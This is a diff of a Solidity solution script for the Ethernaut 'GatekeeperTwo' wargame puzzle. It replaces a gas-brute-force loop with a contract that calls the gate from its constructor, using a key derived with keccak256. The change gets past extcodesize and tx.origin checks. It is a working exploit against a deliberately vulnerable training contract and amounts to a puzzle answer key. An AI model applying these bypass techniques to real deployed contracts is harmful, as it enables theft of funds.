@@ -19,11 +19,8 @@ contract GatekeeperTwoSolution is Script, EthernautHelper {
         ////////////////////////////////////////////////////////////////////////////////////
         // Start of Ric Li C's Solution
         ////////////////////////////////////////////////////////////////////////////////////
-        // Step 1: Deploy Solution contract;
-        Solution solution = new Solution(challengeInstance);
-
-        // Step 2: Call `open()` function of Solution contract,
-        solution.open();
+        // Step 1: Deploy Solution contract and solve the puzzle in constructor;
+        new Solution(challengeInstance);
 
         // Step 3: Confirm that caller `heroAddress` has successfully become entrant of the GatekeeperTwo contract.
         GatekeeperTwo two = GatekeeperTwo(challengeInstance);
@@ -48,40 +45,16 @@ contract GatekeeperTwoSolution is Script, EthernautHelper {
 // Additional contract codes to help solve this puzzle
 ////////////////////////////////////////////////////////////////////////////////////
 contract Solution {
-    address gateAddress;
+    constructor(address gateAddress) {
+        bytes8 key = bytes8(
+            type(uint64).max -
+                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
+        );
 
-    constructor(address twoAddress) {
-        gateAddress = twoAddress;
-    }
-
-    function open() external {
-        // 1 byte is 8 bits and 1 hexadecimal is 4 bits, so 1 byte is 2 hexadecimal digits;
-        // uint16 is 16 bits, thus 2 bytes, thus 4 hexadecimal digits;
-        //
-        // modifier `gateThree` requirement 3: uint32(uint64(_gateKey) == uint16(uint160(tx.origin))
-        // Since calling address is `0x41F669e9c3dCDBf71d2C60843BfDC47bCE257081`, `uint16(uint160(tx.origin))` is `7081`;
-        // Since `uint32(uint64(_gateKey) == uint16(uint160(tx.origin))`, thus `_gateKey` is from `0000000000007081` to `FFFFFFFF00007081`;
-        //
-        // modifier `gateThree` requirement 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
-        // Since `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`, thus `_gateKey` is from `0000000000007081` to `FFFFFFFF00007081`;
-        //
-        // modifier `gateThree` requirement 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
-        // Since `uint32(uint64(_gateKey)) != uint64(_gateKey)`, thus `_gateKey` is from `0000000100007081` to `FFFFFFFF00007081`;
-        //
-        // Loop function call until `gasleft()` meets requirement;
-        //
-        // bytes8 key = bytes8(uint64(uint16(uint160(msg.sender)))) |
-        //     bytes8(0x0000000100000000);
-        bytes8 key = bytes8(uint64(uint16(uint160(msg.sender))) + 2 ** 32);
-
-        for (uint i = 0; i < 8191; i++) {
-            (bool success, ) = gateAddress.call{gas: 50000 + i}(
-                abi.encodeWithSignature("enter(bytes8)", bytes8(key))
-            );
-            if (success) {
-                break;
-            }
-        }
+        (bool success, ) = gateAddress.call(
+            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
+        );
+        require(success, "Call enter() failed");
     }
 }
 ////////////////////////////////////////////////////////////////////////////////////
